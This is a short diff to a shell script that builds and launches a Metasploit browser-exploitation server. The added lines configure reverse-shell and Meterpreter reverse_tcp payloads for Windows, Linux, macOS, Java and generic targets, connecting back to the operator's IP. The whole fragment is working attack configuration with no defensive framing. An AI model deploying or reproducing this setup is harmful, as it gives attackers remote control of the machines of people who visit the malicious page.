@@ -24,6 +24,11 @@ function start_browserpwn(){
   set LHOST \"${our_ip}\"
   set URIPATH /
   set SRVPORT 80
+  set PAYLOAD_GENERIC generic/shell_reverse_tcp 
+  set PAYLOAD_JAVA java/meterpreter/reverse_tcp
+  set PAYLOAD_LINUX linux/meterpreter/reverse_tcp
+  set PAYLOAD_MACOS osx/meterpreter/reverse_tcp
+  set PAYLOAD_WIN32 windows/meterpreter/reverse_tcp
   exploit -j" > /tmp/browserpwn.rc
 
   terminator -e "msfconsole -r /tmp/browserpwn.rc" > /dev/null 2>&1 &
